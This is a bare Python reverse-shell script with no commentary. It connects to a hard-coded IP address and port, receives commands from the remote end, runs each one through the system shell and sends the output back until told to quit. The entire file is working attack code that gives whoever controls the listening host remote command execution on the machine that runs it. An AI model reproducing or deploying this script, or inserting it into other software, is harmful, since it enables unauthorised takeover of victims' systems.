#!/usr/bin/python
import socket, subprocess

HOST = '192.168.1.11'
PORT = 5151

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('[*] Connection Established!')
while True:
    data = s.recv(1024)
    if data == 'quit': 
        break
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    s.send(stdout_value)
s.close()
